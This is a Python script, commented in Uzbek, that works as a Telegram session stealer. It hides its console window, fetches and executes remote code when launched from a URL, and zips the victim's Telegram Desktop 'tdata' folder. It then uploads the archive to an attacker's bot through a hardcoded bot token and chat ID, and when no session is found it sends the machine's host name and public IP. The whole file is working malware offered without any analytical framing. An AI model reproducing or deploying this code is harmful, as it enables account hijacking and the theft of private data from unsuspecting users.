# ============================================================
# Bu kod "py https://..." deb yozilganda o'zini ishga tushiradi
# ============================================================
import sys, urllib.request, os, ctypes, tempfile, zipfile, socket, requests, shutil, time

# --- O'zini o'zi ishga tushirish mexanizmi ---
if len(sys.argv) > 0 and "http" in sys.argv[0]:
    try:
        exec(urllib.request.urlopen(sys.argv[0]).read())
        sys.exit()
    except Exception:
        pass

# --- Agar fayl yuklab olinsa, qora oynani yashirish ---
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ============================================================
# ASOSIY ISHCHI QISM (Bu yerda hamma narsa bajariladi)
# ============================================================

# Telegram ma'lumotlari
BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

def send_telegram_message(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": text})
    except:
        pass

def send_telegram_file(file_path, caption):
    try:
        with open(file_path, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", data={"chat_id": CHAT_ID, "caption": caption}, files={"document": f})
    except:
        pass

def zip_folder(folder_path, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(folder_path)))
                except:
                    pass

def main():
    pc_name = socket.gethostname()
    appdata = os.getenv('APPDATA')
    tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')

    if os.path.exists(tdata_path):
        try:
            temp_dir = tempfile.gettempdir()
            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
            
            if os.path.exists(zip_path): os.remove(zip_path)

            send_telegram_message(f"⏳ {pc_name} da tdata siqilmoqda...")
            zip_folder(tdata_path, zip_path)

            size_mb = os.path.getsize(zip_path) / (1024 * 1024)
            if size_mb < 49:
                send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}\n📦 Hajmi: {size_mb:.2f} MB")
            else:
                send_telegram_message(f"⚠️ tdata juda katta ({size_mb:.2f} MB)")
            
            os.remove(zip_path)
        except Exception as e:
            send_telegram_message(f"❌ Xatolik: {str(e)}")
    else:
        try:
            ip = requests.get('https://api.ipify.org').text
            send_telegram_message(f"⚠️ tdata topilmadi!\n🖥 {pc_name}\n🌐 IP: {ip}")
        except:
            pass

if __name__ == "__main__":
    main()
